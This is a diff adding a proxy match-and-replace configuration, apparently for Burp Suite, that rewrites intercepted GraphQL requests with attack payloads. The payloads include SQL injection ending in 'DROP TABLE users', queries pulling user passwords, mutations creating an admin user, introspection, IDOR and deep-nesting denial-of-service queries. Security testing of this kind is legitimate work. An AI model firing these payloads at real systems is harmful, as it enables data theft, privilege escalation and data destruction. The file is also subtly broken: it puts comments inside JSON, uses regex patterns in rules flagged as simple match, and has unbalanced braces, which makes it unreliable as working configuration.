@@ -1,0 +1,126 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "Test for Unauthorized Access to GraphQL API",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Authorization: Bearer .*",
+                "string_replace": "Authorization: Bearer INVALID_TOKEN"  // Attempt to use an invalid or expired token to test for unauthorized access
+            },
+            {
+                "comment": "Test for Excessive Data Exposure in GraphQL Queries",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users { id name email password } }\""  // Attempt to query sensitive data such as passwords or emails
+            },
+            {
+                "comment": "Test for Bypassing Authorization via GraphQL",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users { id name email role } }\""  // Test unauthorized access to users' role or sensitive data without proper authorization
+            },
+            {
+                "comment": "Test for GraphQL Injection - Using Malicious Query to Exploit Server",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users(id: 1) { id name email role __typename } }\"; DROP TABLE users; --\""  // Test for SQL Injection through GraphQL query
+            },
+            {
+                "comment": "Test for Blind GraphQL Injection",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users(id: 1) { id name email role __typename } }\"; IF (1=1) SELECT * FROM users --\""  // Testing for blind injection by crafting queries that may affect the response
+            },
+            {
+                "comment": "Test for Query Complexity - Querying Large Amount of Data",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users { id name email password address phone } }\""  // Testing if large or nested queries are allowed that could overload the server or cause performance issues
+            },
+            {
+                "comment": "Test for Introspection Query (Checking Schema Exposure)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ __schema { types { name fields { name } } } }\""  // Attempt to query schema introspection to gather details of available types and fields
+            },
+            {
+                "comment": "Test for Unauthorized Access to Sensitive GraphQL Mutation",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"mutation { updateUser(id: 1, name: \\\"attacker\\\") { id name } }\""  // Attempt to mutate data without authorization
+            },
+            {
+                "comment": "Test for Accessing Other User's Data via GraphQL",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users(id: 9999) { id name email } }\""  // Test if users can access or modify other users' data by manipulating query parameters
+            },
+            {
+                "comment": "Test for Unvalidated Input Handling in GraphQL",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ login(username: \\\"attacker\\\", password: \\\"password\\\") { token } }\""  // Test for potential input validation vulnerabilities, such as weak password authentication
+            },
+            {
+                "comment": "Test for Querying Non-Existent Fields in GraphQL",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users { id nonExistentField } }\""  // Query for non-existent fields to check if the GraphQL API provides sensitive error messages or other information
+            },
+            {
+                "comment": "Test for Rate-Limiting Bypass in GraphQL API",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users { id name } }\""  // Rapidly send queries to test for rate-limiting mechanisms or to exploit missing protections
+            },
+            {
+                "comment": "Test for Recursive Queries (GraphQL Query DoS)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ users { id name children { id name children { id name children { id name } } } } } }\""  // Attempt a recursive query to test if the API is vulnerable to denial-of-service attacks (DoS) from deep recursion
+            },
+            {
+                "comment": "Test for GraphQL Mutation with Improper Validation",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"mutation { createUser(name: \\\"attacker\\\", role: \\\"admin\\\") { id name role } }\""  // Test if improper validation allows for unauthorized creation of users or elevation of privileges
+            },
+            {
+                "comment": "Test for Accessing Internal Endpoints via GraphQL",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "\"query\": \".*\"",
+                "string_replace": "\"query\": \"{ systemStatus { uptime memoryUsage } }\""  // Attempt to query internal system data that should not be exposed to users
+            }
+        ]
+    }
+}
